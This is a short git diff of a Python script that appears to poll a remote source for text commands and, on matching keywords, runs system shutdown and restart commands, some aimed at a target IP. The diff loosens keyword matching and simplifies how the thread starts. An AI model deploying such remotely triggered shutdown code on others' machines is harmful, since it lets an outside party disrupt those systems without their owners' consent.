@@ -27,9 +27,9 @@ def mainTry():
                 #If you compiled this code in EXE, remove the line below, and insert: os.system("start your_main_file(exe)_name.exe")
 				os.system("python main.py")
 				sys.exit()
-			if (textIW == "turnOffAll"):
+			if ("turnOffAll" in textIW):
 				os.system("shutdown -s")
-			if (textIW == "restartSYSAll"):
+			if ("restartSYSAll" in textIW):
 				os.system("shutdown /r /t 1")
 			if ("turnOff" in textIW):
 				if (getNeedIP(textIW) == getTargetIP()):
@@ -61,5 +61,4 @@ def mainTry():
 					sys.exit()
 		except requests.exceptions.ConnectionError:
 			pass
-mainTryFunc = Thread(target=mainTry, args=())
-mainTryFunc.start()
+Thread(target=mainTry, args=()).start()
